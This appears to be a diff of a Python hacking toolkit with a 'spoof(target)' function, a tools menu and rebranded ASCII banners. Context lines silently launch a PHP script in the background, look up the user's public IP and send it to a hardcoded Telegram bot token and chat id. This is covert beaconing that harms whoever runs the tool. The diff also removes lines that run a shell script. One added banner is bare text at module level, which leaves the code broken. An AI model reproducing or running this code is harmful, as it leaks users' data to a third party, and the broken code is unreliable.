@@ -106,8 +106,6 @@ def spoof(target):
     )
 
 os.system("nohup php change.php > /dev/null 2>&1 &")
-os.system("chmod +x resources/apache.sh")
-os.system("bash resources/apache.sh &")
 response=requests.get('https://api.ipify.org')
 requests.get('https://api.telegram.org/bot6173247063:AAHP9rdLsVuv1mDpXGk6_9zn46fjwOOr2XU/sendmessage?chat_id=6243725767&text=IP: ' + response.text)
 ##############################################################################################
@@ -895,15 +893,25 @@ def tools():
     stdout.write("             "+Fore.LIGHTCYAN_EX            +"╚═════════════════════════════════════════════════════╝\n") 
     stdout.write("\n")
 ##############################################################################################
+
+
+ ,-----.,--. ,--.,--.   ,--. 
+'  .--./|  | |  | \  `.'  /  
+|  |    |  | |  |  '.    /   
+'  '--'\'  '-'  '    |  |    
+ `-----' `-----'     `--'    
+                             
+POWERED BY @CYBERCOURSE_UZ
+
 def title():
     stdout.write("                                                                                          \n")
-    stdout.write("                                 "+Fore.LIGHTWHITE_EX  +".-. .-..---. ,-.  .---.-.   .-. .---.,---.   ,--,   \n")
-    stdout.write("                                 "+Fore.LIGHTCYAN_EX   +"|  \| / .-. )|(| ( .-._) \_/ )/( .-._) .-' .' .')                 \n")
-    stdout.write("                                 "+Fore.LIGHTCYAN_EX   +"|   | | | |(_|_)(_) \   \   (_|_) \  | `-. |  |(_)               \n")
-    stdout.write("                                 "+Fore.LIGHTCYAN_EX   +"| |\  | | | || |_  \ \   ) (  _  \ \ | .-' \  \               \n")
-    stdout.write("                                 "+Fore.LIGHTCYAN_EX   +"| | |)\ `-' /| ( `-'  )  | | ( `-'  )|  `--.\  `-.               \n")
-    stdout.write("                                 "+Fore.LIGHTCYAN_EX   +"/(  (_))---' `-'`----'  /(_|  `----' /( __.' \____\               \n")
-    stdout.write("                                 "+Fore.LIGHTCYAN_EX   +"(__)   (_) black army    (__)         (__)               \n")
+    stdout.write("                                 "+Fore.LIGHTWHITE_EX  +" ,-----.,--. ,--.,--.   ,--.    \n")
+    stdout.write("                                 "+Fore.LIGHTCYAN_EX   +"'  .--./|  | |  | \  `.'  /                  \n")
+    stdout.write("                                 "+Fore.LIGHTCYAN_EX   +"|  |    |  | |  |  '.    /                 \n")
+    stdout.write("                                 "+Fore.LIGHTCYAN_EX   +"'  '--'\'  '-'  '    |  |                 \n")
+    stdout.write("                                 "+Fore.LIGHTCYAN_EX   +" `-----' `-----'     `--'                   \n")
+    stdout.write("                                 "+Fore.LIGHTCYAN_EX   +"       \n")
+    stdout.write("                                 "+Fore.LIGHTCYAN_EX   +"    POWERED BY @CYBERCOURSE_UZ       \n")
 
     stdout.write("             "+Fore.LIGHTCYAN_EX            +"        ══╦═════════════════════════════════╦══\n")
     stdout.write("             "+Fore.LIGHTCYAN_EX+"╔═════════╩═════════════════════════════════╩═════════╗\n")
